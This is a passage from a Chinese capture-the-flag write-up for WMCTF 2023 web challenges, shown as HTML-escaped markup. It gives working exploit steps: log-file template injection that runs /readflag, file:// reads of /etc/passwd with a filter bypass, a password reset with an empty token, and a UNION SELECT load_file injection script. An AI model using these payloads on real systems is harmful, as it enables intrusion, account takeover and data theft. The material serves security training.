&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) ENGINE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;CSV &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;DEFAULT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; CHARSET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf8 COMMENT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;General log&amp;#39;;&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;SET GLOBAL log_output = &amp;#39;FILE,TABLE&amp;#39;;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;set global general_log =1;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;select &amp;quot;&amp;lt;%=global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;&#x2F;readflag&amp;#39;).toString();%&amp;gt;&amp;quot;;&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;set global general_log =0;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;ez-java-again&quot;&gt;ez_java_again&lt;&#x2F;h2&gt;
&lt;p&gt;看注释有个接口&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;Imagefile?url1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;upload&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;favicon&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;ico
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;访问说必须有 java 字符串且不能有 flag 字符串&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;Cy65bSQWOoDTloxtR2oc18Hmnie.png)&lt;&#x2F;p&gt;
&lt;p&gt;可以任意文件读&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;Imagefile?url1=file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd%23java&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;Imagefile?url1=file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;cmdline%23java&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;Imagefile?url1=file:&#x2F;&#x2F;&#x2F;%23java&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以列出任意目录&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;MXPHb0yrdokyhfxjiducrpohnzb.png)&lt;&#x2F;p&gt;
&lt;p&gt;但读的 class 文件反编译不了&lt;&#x2F;p&gt;
&lt;p&gt;结果非预期了 file 协议直接双 url 编码绕&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;RygBbE1tpogmHgx3WnMcml2mnEh.png)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ni-de-quan-xian-fang-zhao-wo-lai&quot;&gt;你的权限放着我来&lt;&#x2F;h2&gt;
&lt;p&gt;存在任意用户密码重置&lt;&#x2F;p&gt;
&lt;p&gt;token 置为空即可&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;POST &#x2F;&lt;&#x2F;span&gt;&lt;span&gt;api&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;change &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;HTTP&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;Host&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; 28ab03e6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;9b8e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;42b6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;be9e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;2267ba7891b7.wmctf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;wm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;team&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;cn
&lt;&#x2F;span&gt;&lt;span&gt;Content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;72
&lt;&#x2F;span&gt;&lt;span&gt;Accept&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Requested&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;With&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;XMLHttpRequest
&lt;&#x2F;span&gt;&lt;span&gt;User&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Agent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Mozilla&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;(Windows &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; Win64; x64) AppleWebKit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;537&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;36 &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;KHTML&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;like Gecko) Chrome&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;116&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;Safari&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;537&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;36
&lt;&#x2F;span&gt;&lt;span&gt;Content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Type&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;application&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;www&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;form&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;urlencoded&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;charset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=UTF-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;Origin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;http&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;28ab03e6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;9b8e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;42b6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;be9e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;2267ba7891b7.wmctf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;wm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;team&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;cn
&lt;&#x2F;span&gt;&lt;span&gt;Referer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;http&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;28ab03e6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;9b8e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;42b6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;be9e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;2267ba7891b7.wmctf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;wm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;team&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;cn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;change
&lt;&#x2F;span&gt;&lt;span&gt;Accept&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Encoding&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Language&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;zh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-CN&lt;&#x2F;span&gt;&lt;span&gt;,zh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;9
&lt;&#x2F;span&gt;&lt;span&gt;Connection&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;close
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;newPassword&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;123456&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;confirmPassword&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;123456&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;email&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;alice&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;example&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;com
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;WOHTbarilo2xVXxqgYFcu4zsnnf.png)&lt;&#x2F;p&gt;
&lt;p&gt;重置 &lt;code&gt;jom@roomke.com&lt;&#x2F;code&gt; 的密码即可获得 flag&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;WJvVbmXGhoRaV5x5GEGcxHrknRE.png)&lt;&#x2F;p&gt;
&lt;p&gt;flag{test_flag}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ez-blog2&quot;&gt;ez_blog2*&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;code&gt;&#x2F;post&#x2F;:id&#x2F;edit&lt;&#x2F;code&gt;存在&lt;code&gt;SQL injection&lt;&#x2F;code&gt;，load_file 读取 pm2 日志：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;requests &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;get
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;urllib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;parse
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;re &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;search
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;proxies &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;None
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;HOST = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;http:&#x2F;&#x2F;120.26.39.182:3000&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;filepath &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;home&#x2F;ezblog&#x2F;.pm2&#x2F;logs&#x2F;main-out.log&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ROUTE = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;post&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;edit&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(parse&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0 union select 666, 666, load_file(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;filepath &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;%2F&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ROUTE&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;HOST+ROUTE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;proxies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;allow_redirects&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;status_code)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;{.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;}&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;text)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;s:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;group&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;获取 Token ：&lt;&#x2F;p&gt;
